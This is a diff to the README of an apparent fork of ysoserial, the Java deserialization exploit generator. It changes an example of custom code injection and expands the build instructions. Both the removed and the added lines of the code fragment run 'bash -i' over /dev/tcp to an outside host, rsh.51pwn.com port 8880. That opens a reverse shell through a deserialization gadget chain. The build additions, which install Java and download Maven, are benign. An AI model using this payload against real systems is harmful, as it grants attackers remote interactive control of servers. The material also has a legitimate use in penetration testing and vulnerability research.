@@ -27,7 +27,7 @@ java -jar $mtx/../tools/ysoserial-all.jar CommonsBeanutils192NOCC "CLASS:ScriptE
 - Allows java fragment code injection to be obtained from the current directory file **Custom_Code_51pwn** to solve complex problems
 ```
 $ cat Custom_Code_51pwn
-try {new javax.script.ScriptEngineManager().getEngineByName("JavaScript").eval("var x=new java.lang.ProcessBuilder(\"bash\",\"-c\",\"exec bash -i &>/dev/tcp/rsh.51pwn.com/8880 <&1\");x.start().getInputStream();");}catch (java.lang.Throwable e8876){}
+new java.lang.ProcessBuilder(new String[]{"bash","-c","exec bash -i &>/dev/tcp/rsh.51pwn.com/8880 <&1"}).start().getInputStream();
 
 java -jar /Users/51pwn/Downloads/ysoserial-all.jar CommonsCollections2 'xx'>cc2
 ```
@@ -190,7 +190,14 @@ Download the [latest release jar](https://github.com/frohoff/ysoserial/releases/
 
 Requires Java 1.7+ and Maven 3.x+
 
-```mvn clean package -DskipTests```
+```
+yum install java-1.8.0-openjdk* wget -y -q
+wget -q https://archive.apache.org/dist/maven/maven-3/3.8.5/binaries/apache-maven-3.8.5-bin.tar.gz
+tar -xvf apache-maven-3.8.5-bin.tar.gz
+./apache-maven-3.8.5/bin/mvn -DskipTests=true package
+
+mvn clean package -DskipTests
+```
 
 ## Code Status
 
